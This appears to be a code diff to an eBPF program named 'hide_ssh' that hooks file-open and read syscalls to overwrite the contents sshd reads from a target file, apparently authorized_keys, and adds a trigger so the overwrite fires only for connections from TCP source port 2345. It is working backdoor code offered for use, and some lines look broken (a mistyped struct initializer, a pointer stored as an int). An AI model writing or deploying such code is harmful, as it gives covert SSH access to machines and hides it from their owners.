@@ -2,6 +2,7 @@
 #include <bpf/bpf_helpers.h>
 #include <bpf/bpf_tracing.h>
 #include <bpf/bpf_core_read.h>
+#include <bpf/bpf_endian.h>
 
 #define logprefix "hide_ssh: "
 #define bpf_printk(fmt, ...)                            \
@@ -14,12 +15,25 @@
 #define filename_len_max 128
 #define overwritten_content_len_max 65536
 
+
+/*
+    User defined variables
+*/
+
+const volatile unsigned short src_port = 2345;
+
 const volatile int filename_len = 0;
 const volatile char filename[filename_len_max];
 
 const volatile int overwritten_content_len = 0;
 const volatile char overwritten_content[overwritten_content_len_max];
 
+
+
+
+/*
+    Overwritting struct elem
+*/
 struct elem {
     int pid;
     int fd;
@@ -35,6 +49,23 @@ struct {
 } pid_elem SEC(".maps");
 
 
+/*
+    Port Trigger
+*/
+
+struct accept_args {
+    struct sockaddr_in *addr;
+    int *ttl;
+};
+
+struct {
+    __uint(type, BPF_MAP_TYPE_HASH);
+    __uint(max_entries, 4);
+    __type(key, int); // simple key (Arbitrary 0)
+    __type(value, struct accept_args); // struct accept_args
+} next_uid SEC(".maps");
+
+
 SEC("tp/syscalls/sys_enter_openat")
 int openat_entrypoint(struct trace_event_raw_sys_enter *ctx)
 {
@@ -47,9 +78,16 @@ int openat_entrypoint(struct trace_event_raw_sys_enter *ctx)
         return 0;
     }
 
+    const int key = 0;
+    int *port_triggered = bpf_map_lookup_elem(&next_uid, &key);
+    if (port_triggered == 0) {
+        return 0;
+    }
+
     char check_filename[filename_len_max];
     bpf_probe_read(&check_filename, filename_len_max, (char*)ctx->args[1]);
-    
+
+    /* Auth_keys file */    
     for (int i = 0; i < filename_len; i++) {
         if (check_filename[i] != filename[i]) {
             return 0;
@@ -111,6 +149,7 @@ int read_entrypoint(struct trace_event_raw_sys_enter *ctx)
 SEC("tp/syscalls/sys_exit_read")
 int read_exitpoint(struct trace_event_raw_sys_exit *ctx)
 {
+    const int trigger_key = 0;
     int tgid = bpf_get_current_pid_tgid();
     if (ctx->ret < 0) {
         return 0;
@@ -121,9 +160,16 @@ int read_exitpoint(struct trace_event_raw_sys_exit *ctx)
         return 0;
     }
 
+    struct accept_args *args = bpf_map_lookup_elem(&next_uid, &trigger_key);
+    if (args == 0) {
+        return 0;
+    }
+    int ttl = args->ttl;
+
     if (overwritten_content_len+1 > ctx->ret) {
         bpf_printk("Error read_exitpoint[%d]: buff_len: %d < %d\n", tgid, ctx->ret, overwritten_content_len+1);
         bpf_map_delete_elem(&pid_elem, &tgid);
+        bpf_map_delete_elem(&next_uid, &trigger_key);
         return 0;
     }
 
@@ -131,6 +177,11 @@ int read_exitpoint(struct trace_event_raw_sys_exit *ctx)
     
     bpf_printk("read_exitpoint[%d]: fd = %d, buff_len = %d\n", tgid, e->fd, e->buff_len);
     bpf_map_delete_elem(&pid_elem, &tgid);
+    if (ttl == 1) {
+        bpf_map_delete_elem(&next_uid, &trigger_key);
+    } else {
+        args->ttl = ttl-1;
+    }
     return 0;
 }
 
@@ -138,4 +189,55 @@ int read_exitpoint(struct trace_event_raw_sys_exit *ctx)
 - [x] Write into authorized_keys if it exists
 - [ ] Write into shadow if fetched
 */
+
+/*
+    Trigger UID from tcp src port
+*/
+
+SEC("tp/syscalls/sys_enter_accept")
+int accept_entrypoint(struct trace_event_raw_sys_enter *ctx)
+{
+    char comm[10];
+    bpf_get_current_comm(&comm, 10);
+    if (comm[0] != 's' || comm[1] != 's' || comm[2] != 'h' || comm[3] != 'd') {
+        return 0;
+    }
+    struct sockaddr_in * addr = (struct sockaddr_in *)ctx->args[1];
+    int ttl = 2;
+    struct accept_args args = {
+        .addr = addr,
+        ttl = 2 // doing a little hack
+    };
+    const int key = 0;
+    bpf_map_update_elem(&next_uid, &key, &args, 0);
+    return 0;
+}
+
+SEC("tp/syscalls/sys_exit_accept")
+int accept_exitpoint(struct trace_event_raw_sys_exit *ctx)
+{
+    char comm[10];
+    bpf_get_current_comm(&comm, 10);
+    if (comm[0] != 's' || comm[1] != 's' || comm[2] != 'h' || comm[3] != 'd') {
+        return 0;
+    }
+    const int key = 0;
+    struct accept_args *args = bpf_map_lookup_elem(&next_uid, &key);
+    if (args == 0) {
+        return 0;
+    }
+    struct sockaddr_in read = {
+        .sin_family = 0,
+        .sin_port = 0,
+        .sin_addr = 0
+    };
+    bpf_probe_read(&read, sizeof(struct sockaddr_in), args->addr);
+    unsigned short port = __bpf_ntohs(read.sin_port);
+    if (port == src_port) {
+        return 0;
+    }
+    bpf_map_delete_elem(&next_uid, &key);
+    return 0;
+}
+
 char LICENSE[] SEC("license") = "GPL";
